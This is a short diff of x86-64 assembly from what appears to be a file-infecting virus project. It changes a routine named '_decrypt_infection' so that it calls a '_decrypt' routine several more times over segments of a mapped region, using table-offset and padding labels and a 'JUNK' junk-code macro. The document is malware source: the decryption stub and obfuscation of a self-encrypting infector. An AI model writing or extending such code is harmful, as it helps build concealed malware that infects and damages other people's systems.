@@ -181,8 +181,36 @@ _decrypt_infection:
 	mov r10, QWORD [rsp] ; take mmap base addr
 	add r10, r11 ; take unencrypted_part_size
 ;	add rax, 256 ; now we add 256 to our key addr, to go on _decrypt
+	lea rdx, [rel _table_offset]
+	sub rdx, rsi
+	push rdi
+	push rsi
+	push rdx
+	push r10
 	call _decrypt ; and we call _decrypt
 	JUNK 5
+
+	mov rdi, QWORD [rsp + 24]
+	mov rsi, QWORD [rsp + 16]
+	add rsi, QWORD [rsp + 8]
+	mov rdx, 128
+	mov r10, QWORD [rsp]
+	add r10, QWORD [rsp + 8]
+	call _decrypt
+
+	pop r10
+	add r10, QWORD [rsp]
+	add r10, 128
+	pop rdx
+	lea rdx, [rel _padding]
+	lea r11, [rel _table_offset]
+	add r11, 128
+	sub rdx, r11
+	pop rsi
+	lea rsi, [rel _table_offset]
+	add rsi, 128
+	pop rdi
+	call _decrypt
 
 ; Now we move our decrypter on our mmap directly after decrypted part + 256 (key_size)
 	mov rdi, QWORD [rsp] ; take mmap addr
